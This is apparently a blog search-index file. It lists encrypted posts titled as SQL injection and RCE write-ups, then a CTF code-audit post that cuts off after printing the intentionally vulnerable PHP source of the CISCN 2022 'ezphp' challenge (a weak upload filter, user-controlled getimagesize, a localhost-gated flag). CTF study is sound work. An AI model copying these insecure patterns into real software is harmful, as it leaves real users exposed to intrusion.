a386daecd26914e3ddca6645a419d3c0c097379e124b99bc23d7ba90b3e310478516328c45ce6d081b57cd9d39062cd0242e9871c9891a9ffe7ce89141da57f2de0e12083771bcd20b6b7f94fd1f58c61cdb18e4e409a7e0076a46b0edc1cf2b87871fd796853c495d539f6547721ea628531cee5fdc347ae083b6813498b01095cc4a9e0742aab6223b566466d3d91ef0f55009e3cef65820d0cbeff5a7aa9134700e99dc3618185e9ef7325b900bbbd29797a00bf2e505711d3778e4de15dadc724d649c7071a1e9dd9cafd7b7ed6db326cee9d807d4c16a4d6bd4a5dc16289572e479f77058c46ebece873a09ea6d294393fee7e8d61f0ee2d19377d05b4b40c9bc11c97baa4e11a643c5c52007822246eaeb829ebe282618aa5b54dd406a31100fe810a5381071c27d9edceae88d90a2d2b91f34c567c02a6604842356d36ba3601aa8212a542887257cf64336e03b15f9d920c1488ff36575a10ff08a91042d6df05408a9703e637675c0ac9e57081070a4cb5b62c1df938cfaa5c0bf89b2ec1249f6860f35a3eaace9186e3f309628f108025095366d30b0cd9784c1b9b5f59dcb7d8371f3c16195077b1913d29b47b6a852b1e482434bd925128aef6ce2c5eebf77d36c1e51b1d6725324e91cb6ec20f6ce099193941a7e083b6df8fbb64a4304d396028333a9d9aa40998d716cf4a42c46173e4b15cefdd4bc9b3997c6ccbdaffa7334877bf0532d5482a91e45bec12b951efb8a9c2648db2d1a1313d412fcad5859914dd4c370e44cbe3b69652a6709ee50ff4bf54dad0447349425836e2e3a253554bb77ea87f17b4fec33d5b55c1998c824b2e95b16bff0c134661182aaa3a4bad133fb45886ee40aeae9790402bef24e245c0584d308a31ba0f17944cb94e09c4e8b2c44e23f831ec1f172091c7ddfda730dae96d4fd0215440d51367e3e238973ddb91bca3879a6bf78c6976a654394f29745094199a0744a6f159eb71b83ab8722276183db8b8d48895f321abf869fb4992c36cf749fead3050b8d2c427823bd0f993134892dc16099b61294ef217050ca90fb568497ff2fafd8e7d19fe0eb74f282663ad70396ffe27bd83964b740d15eacb1eec483b3d28cd95dc5886e1d3959a809e050d022cd36b1a5a8ddfe82098ad8e630ab96cb488085fcfe3fcfcf6eb507b93445706d3b87044f0fbb879cf37e57a87847242d67730a4e082d26c8cb2b9cd199cc6d2333a99864cab3cd67caeefa7e2574ee98bf0eb890ec45eb1e58b88410e55c48a5310d470233f8862065bddd4e5cea9eabb16f1b5d598aa6f54390031f3f0996710a007170d2ca7de85aacf88e11ec906ea39e34e1ad6b5a941173a051ee56761d532b4726cb2e34bf59e0d86b467d9c1b87b033c39224cdbf791e0e91860c4ecc0b08d43fb43dcf67ee68ec4df33ea61a9b9c2e23db949d8c497bd2444ac0e81b0fedebcfe2ea202426cd3b101ede621530b95e2dc300b914b0bddc9fe469cf931cf204e925561abb60136dae7a43464d9206a1964c3f091a5fdd2325edd9012a2d0f6413e2b93539ce2c082991e92d15e1fb5b61f8e3e5ce4646c3b85ae35741fdfb4b8467f43b174a99ec640264f6ced4b693958069a48ca51c5425f592c4e29ec08562e4f9898eb0db69afc873507d9d9074cd22a410380a7b40e4fe2d4be865879ec584d6556bea8c6fa740735941eadb867a28b57e76ba725ed53def9fede22d64a43a43a0f0406d9963b4f4bf36c2584f5e1562e62172de2336808fdd5dfd48235d0960d189f6d69bdd9cff2992167448f29586a8b905dfce68bacb5e24a9162afd0999bbc1c4bd9ba6c96c8cf82ffb799c3ebe848dc6cb06aaa599af4fb27aa0f26513132b499ec279292d1d1b563d64b309f0f4565b59f219bfa31df98baf416df73bf13f148b4f5e0f2fcc033d9cc2e976cfa225368dc3e92a263ba3162ec603f5618f8a9d2a0662f2f7c5c61ebb571434047a0842c688c1800e388f7a9db2f2ae972027dc40742ebea6905a4aaa5db30a72ea5bce6ecda158cbde5842453c7be9b2c72e473ca098b4f986138d9c7ca7fed2ba22ff4536781a4ea95f575b60640232940fb432e77287622d55436871b46db0c0ed3fb3fd42d1959ceb7e0ba35b0799a90c7e6b60f2363ff018cd0e1017613e1398db6c729343cdd586abbbfe20eb59382e41dc81662f074d82b07cbc29994a1495cb88cee0211bdbafff2551d3ff39892470b30e02a0b64a044ec0cf7681ccb6048254e367fb8c227f57fa36972dca91d2e7cf2739d9786cb33919d95ec1e608e98b9be11b886b28a23186e3c14d8c04ecca4650ed927691c893032895b9a8a9b758f1a35896b9184916374cc9e82286b4a77127f0310b4c0c1acfa3a956edc93b2acb02dac6e7c370b572a012e09b2b03595f8a9e98184810fe50c93aaae67f844a8861791511a418260ddca39611f70e7fc14e687a2b8d41b909dc2dfd1a90e53ffe3ae3d32aaa13dd24507079869d297b3c806fd560ce41cb1d6f730a0d2d73e27b15b398ca4510113e55b4ad7710913fba251898f4c92b4f586f818e389f25f26c14b1faa36d3e3179898351609dc12d4bf901fbfad71947399fcc831915e067638a1054c4b5bfb3c42b6aafd446a056fcd5a2a06f95d2da31008b00f8319f82876508dd924d0ff51510c743403e88dc1af31d5b0992672ec542416808c4f9c2126734b5b8253ea0e2f47bdca9fa4c21a979dc572e888570f51a708cee51689edcdd44a7ea83ea8acee00fbc5f67cfb06cd4e7145b39204417cdf5b0bf1a696e31d4f2e5c0af86b2311ac741bebe2120cf25e42f41f108ca84cc838023692e6fe9fd98b445f53c07c5d5aa081db9e2ea4e6340eaab0f2fc2d46fe6186b12c95b53371d19eb2a719620a5a12988dfe53f0f074d8fb4cf115220b97ae092efdb71909ff00c2c0f8d0604e49ed7dfcb41bdcdcb06cd210c0f2cea43c05d50c64253d84cd080fe53d16c43b357cd4d070238e7655d150a14fa958c33502e5e6d704d6245aa1538612152d3cbb6a590bcbc824fab394cec16649eea0f935863d80d7b923b8f2e764bb63092df3ef5aba4fd865e5110169813cdca0303903a367bd051ed509290b783d22c40d534efe93373f93b9984fa7aa94a1827a38c63b361f36d204bf3825ae424930e935d5e84c6076c14d19ba36f83fa2fbcf7ee8da7c6368dcfa4d3e6afdf93c9e7c0c6f3beca05b7af65df83f4593884a375114cb05c0b7eff32dc5ab63953d76dec8d5060bc235625ecdf13bf30376cabc9fe11aeda93b855848a59a3f23c10617588f8ca7c95f0fd897c8ed6271c8971403b9e5402db541fb9d4980766884e7a36ed2ffd0fcba213cd07ab463c5471ed8a0e0ba40e33cd4819535fbf5d346f11db5e04d9c8d9f758336971d709c3ffe7106ec4a4db138458cb24ee13a8af2562b8e0dddd7c0f33b1613a8cfd37d412f4b549bb8651151b0fd23a73cc7ac569459625fe0c5e2bcd0a8041b74daf12eb15224c83399f6767bca1d86b2512cfa57e8e56535a9048c51a036c85c920c3c51f0523bdcabeba7d1a413e90d1069a9904a9169b3212f3b919c84a8a7dbfce089b03094baca6768761b247e4912ec671b21a461772266a2f9dc97f1e9df90a8eb723e2b65acd4d734b4baffbcf25b8696273fbae60a15bb348e32d73c5bd40563366faf1164cbbc14b6553bf64651f1706982bd174d50539caa4ab68977a97cd2a9b25261d00ed9db9ccbe730cb758702bd6adbf743b191f2cab3534bf36a627a46f4a9ffd9549451287db928dbd555fd3a02d6c54e90c5aacd03593c55c5a8c1704b2879ff054517ad7de0e4aecda91f27c0f6752644104932507bb11f497181d789cb6b20bbe28b7c7a87dcc6e57857841477dfd0f5aa25d8d4634ad09a41c9e4697f978d73dedab0ec46de1cc7c7799bfeadd401098b04d1e8583add4d55630ca09008a2d99f0ddbb239a1635c63de3f614981fa8a2ed8a6c7770651965dee71748e36ffc0fcdf74d8e019ed618947b33a81fb3712c0b2a2530af3ae1d38425fe3b4cae7a14e24c3a53828d59c51add715314e45a92d1ff167ec25901fc2aa082a8535002560ee1dd69eefcc07245c77fb33353ff79f108eda9c4b329624c6506df9eef773287c8eb1c8a73ae6bf058e1c8ef164f08d96b1f4f626e63baaf4c54c6480edc5c9d68536920dbc346bbb5e51c72e2b661adb89f290cd821f0577cb6e29a71f04d0cc2eb2c9ab0321cd4569500e716e085e1eabaa5a531c4f64b3cac0846edca4a192168cd76141a86ad4c95628181a1c51b1ffd34acbdc88e70d042b7bb923d4a91ec011e67f6642064525ecc1f4a93c73e034d5837cbd18936467b33e3d7774fa001a68ebbca4d54f7a51780a5fb6cca08e611e342acc34546c06eded8ef258b681f8fcfa5dae3f542c5d76ad700dd90520cfb20b7eb9a0eeb70b40aab390ced185bd619f06f7c6f867f024e491f29ea63ab5c1152cc8101e27e55c4f2f246a08ae2d2179b7d4ae102066f3c3e551947296fd94352348018cc2ef4e6a5558afc3165a1c15bcf6b2a385d43694e7ff288b9a78ad9348399e4726bb124ec8e8c826a3310b2f888804e7c34149934c0757ffce47045e728d451180eaf9dbf7e9c4d85831c4c3f4e363e93ebc6b0802098737c68f083cf0e246e193d2fdd25e4b196c0243c64f76df4f292a53f8db5d064595f1f736b751cd873ac37ff13fba2c3e41f133ff128b246342d9d6ff6037d7f8b33c251cc7b0e4c22b242e221f33796e7f100b192044e780e4cf2192eee3a89f4d99b63fea53263b6e55ebca5f3d867861fe79182b675e2e65b2b445735f5895bc1f173448dc67f8bbe0c3f14186d486ed36a01a13bf4f1a19974f0ba6b61abb5828f477fdf240c7a6031593de40a343ef461ac55e21a4bf29e2765cd7541f442d1d3b78dcb86d12ec60d1fee4d953ef4bc5af61dec69f73264983013132c3fc220f649a6b827cbab2cfa037a3ba874a7da3a6918927294e65a8f462b76c7dc18779e0bc82ae3d74b2af740cc48699f330382ec794ce87b3337dbfadc685ad6194bb288c36d39feb2dedfcdfcd86bc34d887986105a45ff1f7b678df81f3fa777a6fcac0c3ce8cea0b67490c6d11672da91a9d81fa9e66b1fc0956e122435a2854463f61483183072bf070f57fae1e87fe738945c278589d079d18f70386a2cf585a405ca76c554435170de930fc7beae0abcc23919258ff8f0a889a9c17f82cdba6edfe238e713498c95490590629aa049fef9609bb53626a809d61db989f3d4e72cf9deb739c9e538eedd2395d7b3bbf6534af360c02d3181b2d8fab884614e1dfe5d099e0c543ae7925253df41fdadac03544820e26324f569465c5b8fb260176a17978d90e78f87e988246af58f13b34bb64a63cbfb8063c7ff0202296e7958ab0ce26366f6056a10a8007bf2977f7d0137f7a4b190f188172190fcfcb7793719352ea5355cd824ff8d79834d5f9d6bd55c834347e918362e1371ae24327581dc1041ae8ee8aa6bfb05918a493063d54b2ab5557da6cfe63dde62e3bfaafbbbedb338921a5d5478d76213bb78748cbf8787b75a70fd5633a8727f8a893a8e5e8971a686f928901371c7f1877d70ae07144bed4716e7e452b79a969a765c6f590239de947e2300a92b24b3d82bcca72adb97e2a6209314095371fecda26ced584570273a4fdb62b642bb10db7d00cb56ffa38fc59549fd2ed64fc46dfdfd542791b4cee57d6933ca8b197a81b4dc1ed4f9908f70c6cace6bef8a95a8621fb98db96821b39574d949b76539c52c1d15f87f9b09227e70f6eaf9a63f40060a53ee4b5fe5d550f0bbaf340994cd9b21 Hey, password is required here.","link":"/2022/06/22/%E6%B3%9B%E5%BE%AE9-5%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/"},{"title":"禅道后台rce_getshell思路(需配合adminer)","text":"632da19c59152a0a8307414dfc9939ba91a3d99afa0185d1a78fbbd84763cd59644f4389b06c7dd5d705895911044f41dcd35036a63beadeb45e65cf8b4c416b5cca803454b9231fb7b35a7a16d217d558d63ffe6ae4c10c543969e16938ba0fbdb2dfedb3a563d009c3ae96ff73759ba4379b296b7d4fbcf3af79a3316e03621fd95c9490fc9c0ad92d82e34d3f57414d5cd13bb905501423002f1cf56b10e94dc85bf8085469c01d96e640dda5912be836d3b9c5fa1b4e23419b377d505ef0c1e7b41763ea14bdefe47b24e340c8c57594c4025d5af2c0182108af894e818fb83bb1861b2828551da6a919a29c3a6418a3a79d019303071123a3681146b1b7780f155173cc30879e918d20f0044871c091726c9f94157412642df4d9b866517138623442570aace3f0ade8ead15714765c86a0a304b96ae9473eb7d7c72852fa391cd72e8a97cef3f0cb28e5169e451e80ab9a7ad15a6d703ff5cf3cdf3d2c0e40d0166b53efe685f482d0363dd43262edfedd809bf840490d0a7eead57e797ab02275e0dff2ad7058d2aadacba49eb89b710e8a61a1ee67f72a723ef44d97010789b033d1f2a0498761e27737967ac438ed2344e792bc4ac8d842bb9e690f66826f1d770da2e72d164ce277a208c55b897f67aa692dd5f0d0363168e2cfd4fb93bd798e63606fc1e779fe7e3b20a6a8a48393d0b16733db2b7f014461eb45e3ff2cc240711988a15885ee5dacd31b8c0ddf4f69e214dea8c5e188f7893f1c0942432e1bd87d07f53bd9be208d1556cc4ef401a4accc97b798beeb954257dcda5c81ca0ffdcb9162313183c3e4d08989cfc6367d4ec8aee18dc117a7b894a3add355532198fbe33da715a5d06edc11e9d53a2c5b8abf92c66eeac1168952f37030b286cebb7d340e2d65d2c9957f9ae70943695cc7f7edc1ade22a0f71a77fb74e7487b56f7c8c879cc93d711962fcbf4f8c835042e72fa575f3cb3d3770f401f11ac35b4eae8d27fad452d84effeaf76ed69b1d8e0d8b06ac23d05869d9b3b31561fc4acca7821acd969afb31193f36586d3c3b656d2d5c54afe7d7c6234a7d07607efa99394211b6703169d95b58ff7f5468f54b0ac55cbaaec7d727694691e324b1fbd5557d274eae9f0d21183c79558027018def16117cf72caaaaa6729c55f6979fefa6d6eddc5a9cf38a0603a14d408152fa13e503b1513887b5855012f6dbc7bf7a2590441ccfd41e09e57c09ad708993dcf686522d578dcfedd0ef98b11d74bc50adcfab2ccd00f3c842d7ac9c2d8da1dc57f92d05dc48638cda9775112cb61720bb9ffc113fb76de8e6fa496438e3c6bfb513b804476c5371f5e37ba7468b6436a846bb17100496ed2af13d833dcc12a3a61b1a176edaf3a76860225c57d194b654224e30088b0596cefa435dd48e6da728193883a7618c820a210f08ca8c082092d75524915e87ca5f641e2d3bd66a949d8207d5ea08c8cf979ae24809ee454c0d0807bd71bf8f9276587eba70dbe39b3151ebb5bfa9b8fd1ceecc7bc8b6fef993d6107c5e10dca4d474197785aa59bff59c47c5028836fb51aa06f8c0ed26e598e40804fd5bcfda3bd9fb0a6c8f39bc25ac654f228cb1f1cc3484f46f87969b275a73b418ef2e8dd218bfc414a37c0ba1cc3bff88ac1cd01b45304eb1d20df2c80b05324bc7d9b1906f82e394fae52e5d25d5cdd96c425045864c18ed74b2cdd3a8c7fe3e68a6aba0dbfc5a4332fb46346796365d6386cf0c3cd0a8d7644d03df20f0570775582fc24089d730cdc650cc869d9468868ecbdf14f9f3c907eb469df6f1161e2e43893e87a5b17a27724f502d2adf8465732ed342ae8ae9330ad1dbe9a16e5cf06a8762517a4b0282b677d97a08ed79058e7e57afb2c2a6e630efbfd4297041a98117b61ce4f38b1e5feae9da5ba79a222172199625d1a9a6012acea685336a8f9c42733e3de99bef948c034524c2d2fea275326f54fa757b28745d09dffa391fde965b4288d58e4f8f4200762e5e182b9294e606b56db1cbd8b2b660fae3d5e1eca5ed9a0be64a5d3b5ba0df5a6546568897a08eed86e31dafea2a89b1a9e1a1a68871ed6de38963fc2f3fce5e70c4715657ee43f0dd227e17c8e168697e9779d5b42385ed1b7ddb359e62d656ba41017bac0e33705e88012fbff430b6a09f51907e654705f578fe081c5cc5a58744640159acd5e7e27f7a437b1679b312b4492250b239c6f4a17329a5eaae04e32513aac2f748f3cff926e47d632eac4173c0811331e7c1000013b2a283972b356e39ab40b6ca771d0905fc27a0a205d394bccad73d080165ff14f54d825c2f1e1fafe7cef82de9e7bcb075679c896ee48df5489149328b5747e9b3ebf6b6f41f633b031bbe70ad1dc6c112f3463efd770df240bfc819f53e081ec10a55a9ca30450b0beaf593bc314106e94ff3f9deb339134d882f1d86f654806d947f119ae0bc57cde23f7886418ecde6ad022f2042a3cbd5f78b9d9d6c7ecdbfe8e90e2cb858cdbb5044c8ee33deba678ee7a93140d26fa6c5332f7a2b844a2c47223fc18093d27500741a Hey, password is required here.","link":"/2022/06/22/%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0rce-getshell%E6%80%9D%E8%B7%AF-%E9%9C%80%E9%85%8D%E5%90%88adminer/"},{"title":"舆情分析系统RCE","text":"54c9f5f23ee0067f9acdeaa6b301b8ff51940b590025946020ad4add1b1c5e5259be0337ac4f298efbd7a7ef92167a8f84a9e3e4836b2482cb486ec18aa4dfaa54d523a7fb041b722ac9e875a2a74975e0f13b88e5a954bb76ffc8fd03caba0ca9b01a36e1afed021c1a265fca13cc54f8363637e104beb55dd50b5fe36577661e1eebeac1736226c25e071ac701671189c0a40228e8a5fd8e5e703bfb36dcc700a9b503bf48f013238025ac93c715906fa0c92521d8e0784e39de3fd0b9fe309401f56822632e122d74db8f4a68e2782a1ace63a176d2b55b5662c551567fdc75e612949739d817caa7072f7a4cdbd4444bd620be17bda0c02461c98ac1eff187488fa51dcb69f4cb3d8b2bb1bbe3afe569f059faac380ef39c82b3de03a04719d4a3fb5408a7959eb417dad3cc9119c31e504c625b0eff4d735f8c0bf6f90e6c4e703a240fcf6f2de517c91dc6e0ea2518c0aec0a68148a1bb5ff7caac96531815c4f578f7d772fcd68bb96e41058c34e96e95fd777a02359586ff9cc49e8fcfcb3684c821f4f90716b1cb3d9092092f53b13e7cb4da00b32448a3fed9dcd46d5c39320a7b01d4b94c1611c5d4ac8d3cd74e0a25c4acd423fb5a6e43b318e316680a241bdb65e83b90a7568eb598d82e94c902c8839c81135dee4158000304cf952249f8df01e791b2d3db2ae8b337ffe90a99d170d1e385f35e99589808bbc5557890673e567b907dd33b72a59db148bba2899fd9e8482a7acf54ddc2e20cb0e2cc321be66f60101cc431f0f0fa258a578ef6091007796278fe693986f6228ed9c458c67ed6889281b83bce77d961ac283f868a897ae9dab958cb69d91da5694fc753920e1c152cfec93b8073ac3d2fb5bd9865abf0b1c50ee0fe9b0b305abf9d1fb1bdf63c37e9d68ceac62fe723967dd41d81e6c4df052d0273cbbedd98ef1590c094a046880dcc3d95c637621397a55006cee3a75a9a38af6dd11d93adeaa0cf7471609373492fc7fe98b1500e02f6baaf0db32e92d832aa28ab1253feba49c73a35469e2ff6f816e71899be66bbc333d2a3cc346652fd09e9700d30a743b6563283ac4911cb838650cbb5ccb3e64fe35943f81630c095f406d5d6380c80fb7b96539e83082d2ae8d185c62641f15ff9d073cf5e3aa55385a876bf53bdf1f199bb7696d96826cbba59b9b1dc76798cd6bb6f35a4f038e03cda57ca02854ca99ec80865f5c79449041688b33a4669224606ee21c61492e5642b8f299051f32ebc9ed98a26a13d5f4aa0a75cd95ffe13d9fb6785b7cdb2371cd3eadf290af4e112813a597992e4442113d041323352263a715c08f282948cccd99345720143f36a3af733ada8030b990d80db11928ee8fe7fb15e8776e974dc13c43ed50e7c9c00c79a52db90f0f723b39da48f9c32d5d6bec5f74048fc50a68305b240f7fe026f98846ffb10e507f0c987ff390a928f9189f707a32f9c6868d9c3788e231e800d9cd3869a6db9ee303e5fd796a124d71eb0b2f1318e554bfb3307405dfd65f2b150ad5739abbf58dc77f0dae05a781c2c0b3b2d217200208f1c68baea0b429712786b1179e24734e067af2fc93bc7fcf41d039ea5c7694be0ce1617c472aad778fd36e46ec86159b0f12e2a9ae8f67c8843492576874ed97a054e784919a932cfc96bbd1f98a8592c09b39a94bbcbc73a633e1f93184f492a10bcff3d49e304397920b6ec1db035077d569ba5a61c984243f8b6f954193684ea61725139fb88226af9d826a55abcc43698dc6db97a268a824a9efa5616143fcfd3c6a16bd765540c56ed4971f69d34ef530f003d97fa0c79898b42ad9bbfcb74e9843a12b935242f95722cdf10674b2f9498b2ae3b67cd75746ae17013702848738ce66ba7d761e7ee97ab0716b6fcd8bec2d7149c74e14c5f3979b5a9f326ce9181bd507bcd8346017000903c870200a49ee6d1fc4bbbf1dfe15eceb9d16c609e4fe5ae6032edf91ab5279144c15e2cad691449a66efd5744fbcf98fa69375a88c5acb1f2d746a703f675d5e87f07229a270514ead7ec7983108252daa9692a7ed8dd299730b1504abdd53342dbcc58dd02def16b32c49de87dadabe3c4a637c183d45c0e149c36d82630ecff09970bad26630086751a75837f393cdaf7e54434b258ea2877a83a74caccac8ce41752b31faba847392b8520b323f7bfb95546694f5638b37ca39f28ae33ca37316497568e4350c76cd43e78275ad61c652fd32e3a46a5d3964d734b58cd454bc2cf647f3ad498af1ad0c142f2d338b1ffdce132e922e8f2430d6acfc2d8b93fa258464bf605c1ed25226f96fe7c43b174a706849b18d5da92882e6d9c1b4f85f63f0b7f7ce9ced388d923511f8acf4d9130cd4efbf8737ad3d6dced80f1a6f28aee1f99a63e075ef268e176c9999def4ed80da38c956c0705efa2ac7c3a55e9e98c307110f7807708628b508c5fe4d9a606f9484ef6914945db175b97ce7c502696c0876bdbd4f3cb855451ffdf7b122abda19aff8b51409f26a5c7e70ed40413c6c1d7e25b67ff3ac92634c9799c7184ed44a44d6116a2f6121c6d617cd1e517d5ad350a5c13555d30cc8df9c1764bdbff98eb932d37e0c1cc68cfa802cee5240097baef5ddaf07eeddb3c20315ef222ca37b3be89f6304c46f2cf9877b50461ae41d50d9b9e4c2139986619f897a05d431ffd50b7eebf71e6df0159f060eeb778affd00025bc1018f829e743d6dae9298022b63313643765c6ae3c122045ee2aa7851ab3a46ab890d86fc4ceb042632df6651ffbeffb176c259972525437a2857528dc90891dcae8cb8e9e8ce01a6e4f38efac7e3a6f904f8c8f276d5b725b7cf096be87d3e37115f1bd26f8238626b46c7b259c921feff6d150fe4cd9962e1dcb6ad3915ea7cbf06264fe721dc147beddbe39ead8b2ceab0f4c66d52212e1efd3a1b37c6a344dae8490492a3da88a289408c0fd07e6b2b658d41d2a8f2464039733ca8916f408bfa3f0811f9a26834f57cc767db4b922947bb8386428ee1cc0a9f77400be86d1cc6aa2a1b4fda90b40e9476b791b0eecdb40edc0e717effe69ee2b0d7b27b7a318f5db8f51fa7b034c5fbd3ec15a5db6685f1754693c0e9e452b81c43716d2a019b385344546d26afb6ef967bac3001c40f365df7b1a4cb39d11a838967b474c8011c8264cac2e44e5ae60b5cdf1b52c39157452a7b1f02c83efc193b9e0143d1e3598f974ca2ba4d18620f418a72488262c0cfb965e06e1785134ce66d056a5784454d0929d75284d7026e4a95434867688f56f5ccd78bfcd4960b4ac0e00088570e4bf094c7db26f902ccee56bbb6dc179059f87fa8a7ef072a353756137b966ac5b489b44e68e4544dcac6761f18b6d87fc1d367f41c20881b9e22cc39b743927bfa36c6cba0f12b591682345808e1347eba63650b992f6a0dedd5e214e8455cf672497858c4d46b1f6d4b4c8e46764b6dff83166249a2793c226f45c610e6a14e0e273db8dbc303c6680a272951e9bc9faeca943b7276766d89dff33c3b680b4bb553d7ef9a373ef423e843793f6112ad5dfb79db9815347bdbf6398c0ae9cd0108375c25446d34ceac41f244312c834eb3ee4d330ac4ca761eb847e9ba24881dfd165f8de8e6f506345b324b8fde34a6ff02fd77f14dce55585f9e8751cf8419102b6d0839de641ff5ac11a6fc089ec46fa4787857bddac708a84662be3bf284d42bbb80c17f427bbb598dc6d07e51f9692752c7879b1ce348f705ac4fcb785579d5564eb6aa733a997f76552d14bdc39009a481fed441784bb6223e1c4da3402c2b511152e2879cc279c6032977c8aa644c3c3161e1bc6e52e48c28f3df71a3337336f53378e2635e75b8786475b2dd782a323732f812448b0ff29b15dd3a36119c33fc8c2e62191603bd6547ee0d648d97c17290e9a6a3c31c506e577bd83b6e8ae30f885b043814551d1588d2cd21fd30cb336d23bab42d3b06a56889ea9935bafc76e1d4629197e357a33d985aa98849d868cd56cb3ca64653fa3ebe2b3a2b38eab98f4c9db1e31e5cce1df9b4f9c3f57dc18efa153fe7ee55c3f56d735ba5a7b90eb6d6e75a1a724b7d2b41b484b4111d67e64a8e2292c655fbd474c33ea35a00775ed935abf558c3931eab90d96d338f3541fdb3b44370aadab30b96b47e5c42f5cccb5bb4dd8827f796020337c6306ff56d6cdccf4546c166a7080214a0944a239cb305e5e5a710f85dfed7cb92b193d752b9f02d07bd500b07627ade48a4503f1f7b1a627e6abc7bd30346b8373609d54bf9bcc882ab0fdde041751a39e2e1376485e6e8ae56e4d2d420f1aa6d2e991687ab6b4ffee3b1a52edfba1cc1b6af587ddff40d36b4c1351706376596a0ca04ac68815546438d647e25fe6a842251a618f6120629001e7dd7bdb8d2d34daad138e31eccb758882fc29d2f3d1877fb5158cdb49237abae3b7e89e84572fe6ff6c8bad4df589ea973a80bca0acfd09f7f398a3cfab598c92f7ac7557a2f625a5bc020c05f070bb5e66093569dc30d3ad78d5b709331fe48c17182f2e0f39048c0f3832d3f0c70711df5b5755e4e04077d81ceac31504f63a5d5435072cbc68e17c2c1f4dac75d690139f68ffa4131435e8705016aa2887e281424c62b53f482013e0e21b52d40f7dd8b69e81dcc54d9c669e97f51461473d930fd76606c84899452a5ce1adb74c9d5bd1796c9b8a03e92a8146820e44f902d983f03eb9d7fcfeeab320f72623864750815a94c04277fe5e129170b0ae28bcbb40b5a1d9c5d662504a38762c2d21130f87c9133222fb917089f9bf958eb007f57b96d2130bef71494b9a85a48c50d01d47d9012dfe825d606b04b48251695370a74ef6f9450e82d37136488127255dad8997ec67b7bdb6e4cad7c27c9ffa1483c512734400a407ebeda69966f67b12c2623ef87334950f518cf51c637ed6a777bf5eae04d7f4ecc59966b59b6175e819772277655a9cbad422b8f764d3262bbaa311af62d3e3a08075ead6fb47d7ea854f27a4dac8f5ad22eaad1c81b3669112747c976ba88ea7e8a6ebd25b208047eba4dedc01a93a2714e4c616274a0bfc2ea233a375d3cbe9830733cdb7573fe86b625db30f0554f041e3b6ba0a22ef67ff707d23e8ca6d07ea9e897f2cdb0e0842a0e77b1c33241dde717ce7ef0f02cc7d361866adb1e7f3a76bd4a99b07b667ad018e950fb9d9ed36283599aaeb2def9e9b753faf53be57334487ab33d04fd1db8319181b8663ee21abbb8f80cf5c361ff7ea83706668f2a8eac468cba381d32e0e149d82414684836cd627ca479ce7b5c0610d2fba14b34f2687ab4c6f2039ba22536e77111656fa615a3f7da9a74ba10f720c605f65b6729d812e3c3eeae5fb78b57ac56766b9bcb076f1cc71b9b197de9a21c783cfec565206e7c37bdd482c904eb3191fdfe19f8ffe5cbd060ada585e77a57dc94b391a07f6dd0df5ed48f471eade85f03d1fb16bb60d014baae466f42cd7d3b543eb9bb8eab46e4ca2cbc3b2445e0105b8afec2cb4334aa5ac7fea959547929bbadc8a6f0faaa41ec2743fa442852e8fc58ff4031bedf9fb1a03588ea8fc86cfb18c4eb64fa51e51b778ed21024801363089a3a66285721a424e9aa537837bd67c3847429b1e17a4e7fd42ede3b1e7978acb3bd17387ee8b17216b4b8fdab0d391f6a91ab37ca7238cd90ae565279715db9ecdad2adaa2a893571dda90b1488b7933d06fd12c52a21f935ee80093f94d7ff94a1aa83cc3244b6642f46ff9ccdc6f3dc01b315600f5a4b855b40d59d726ba89bf0b05a00a2cdd512adca4d5a81f766a6d638b0c7a66cafb55bd8286cbf6bc513c52e67fa27db780f3e772bd81a387180af9039a30737b8ae1db7d491cd45ed99f3e7d0bd5a3a7a57463c7ff11800adea8ea5e3851c20e2cfd2480fb606d1738da177db84a084990f133167cadb2a5fa036d75abacb9140ef8a053b6e849137661dbe23c376da5a8ea146a22f6a056131f3066f07dc0cf8fd137c9a309cdbc5a647c9773ceab1c9912d36457a5f1a212aa7bc341dff1c7ab40ec72e0792416b9f00dd9b158677d6958c4abd19edf50879e6bb05b61722b0f8c92617cfee86b2b49737040c1fd32589b521ff04d2a8f30b4e823011c44de560 Hey, password is required here.","link":"/2022/06/22/%E8%88%86%E6%83%85%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9FRCE/"},{"title":"一次php代码审计(复习)","text":"0x0 背景源于ciscn2022华东北赛区的一道题ezphp 总体结构如下 upload.php如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpheader(&quot;content-type:text/html;charset=utf-8&quot;); //设置编码highlight_file(__FILE__);error_reporting(0);include &quot;config.php&quot;;ini_set(&quot;max_execution_time&quot;,&quot;5&quot;);//flag in flag.phpif(strlen($_FILES['file']['tmp_name'])&gt;0){ $filetype = $_FILES['file']['type']; $tmp = $_FILES['file']['tmp_name']; $content=file_get_contents($tmp); if (preg_match(&quot;/&lt;\\?|php/i&quot;, $content )){ echo &quot;go away!!!! hacker&quot;; exit(); } $filepath=&quot;storage/&quot;; if( $filetype==&quot;image/gif&quot; ){ $random_name=substr(md5(time()), 0, 8); if(move_uploaded_file($tmp,$filepath.$random_name.&quot;.gif&quot;)){ echo &quot;上传成功:路径在: ./&quot;.$filepath.$random_name.&quot;.gif&quot;; }else{ echo &quot;上传失败&quot;; } } else{ echo &quot;invalid gif&quot;; }}function checkimg($img){ var_dump($img); $check=getimagesize($img); if (($check!=false) &amp;&amp; ($check['mime'] == 'image/gif')){ echo &quot;safe image&quot;; } else{ echo &quot;go away hacker&quot;; }}$img=$_GET[&quot;img&quot;]; if (isset($img)){ checkimg($img);} flag.php如下 123if ($_SERVER['REMOTE_ADDR'] == &quot;127.0.0.1&quot;){ file_put_contents(&quot;flag.txt&quot;,$flag);} config.php如下 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phphighlight_file(__FILE__);class Mysql{ public $conn; public $dbhost; public $dbusername; public $dbpasswd; public function __construct() { if(isset($_POST['dbhost'])&amp;&amp;isset($_POST['dbusername'])&amp;&amp;isset($_POST['dbpasswd'])) { $this-&gt;dbhost=$_POST['dbhost']; $this-&gt;dbusername=$_POST['dbusername']; $this-&gt;dbpasswd=$_POST['dbpasswd']; } } public function connect() { $this-&gt;conn=new mysqli($this-&gt;dbhost,$this-&gt;dbusername,$this-&gt;dbpasswd); if($this-&gt;conn-&gt;connect_error) { echo &quot;Connection failed: {$this-&gt;conn-&gt;connect_error}&quot;; return False; } $result=$this-&gt;conn-&gt;query(&quot;select * from test&quot;); if(is_resource($result)) { return $result-&gt;fetch_assoc(); } else { return False; } } public function __destruct() { $this-&gt;conn-&gt;close(); }} 0x01 想法1 